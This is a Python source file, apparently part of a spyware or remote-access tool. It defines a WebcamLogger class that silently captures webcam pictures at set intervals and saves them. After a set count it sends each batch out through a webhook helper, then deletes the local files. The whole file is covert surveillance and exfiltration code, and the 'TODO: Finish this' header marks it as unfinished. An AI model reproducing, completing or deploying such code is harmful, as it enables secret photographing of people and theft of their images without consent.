# TODO: Finish this
import cv2
import time
import os

from config import LOG_DIRECTORY_PATH, WEBCAM_CAPTURE_INTERVAL_SEC, WEBCAM_PICTURES_BEFORE_SEND
from utils.logging_utils import log_error, log_info
from utils.webhook_utils import send_log_files_in_directory
from utils.file_utils import clear_files_in_log_directory

class WebcamLogger:
    def __init__(self):
        self.logs_directory = "webcam"
        self.logs_directory_path = os.path.join(LOG_DIRECTORY_PATH, self.logs_directory)
        self.interval = WEBCAM_CAPTURE_INTERVAL_SEC
        self.counter_max = WEBCAM_PICTURES_BEFORE_SEND
        self.counter = 0
        self.running = False

    def log_picture(self):
        cam = cv2.VideoCapture(0)
        time.sleep(0.5)
        result, image = cam.read()
        cam.release()

        if result:
            cv2.imwrite(
                filename=os.path.join(self.logs_directory_path, f"{self.counter}.png"),
                img=image,
            )
            log_info(f"Logged webcam picture to {os.path.join(self.logs_directory_path, f'{self.counter}.png')}")
            self.increment_and_check_counter()

    def increment_and_check_counter(self):
        self.counter += 1
        if self.counter >= self.counter_max:
            send_log_files_in_directory("`Sending webcam logs...`", self.logs_directory)
            clear_files_in_log_directory(self.logs_directory)
            log_info("Sent and cleared webcam log files.")
            self.counter = 0

    def run(self):
        try:
            self.log_picture()
            time.sleep(self.interval)
        except Exception as e:
            self.running = False
            log_error(e)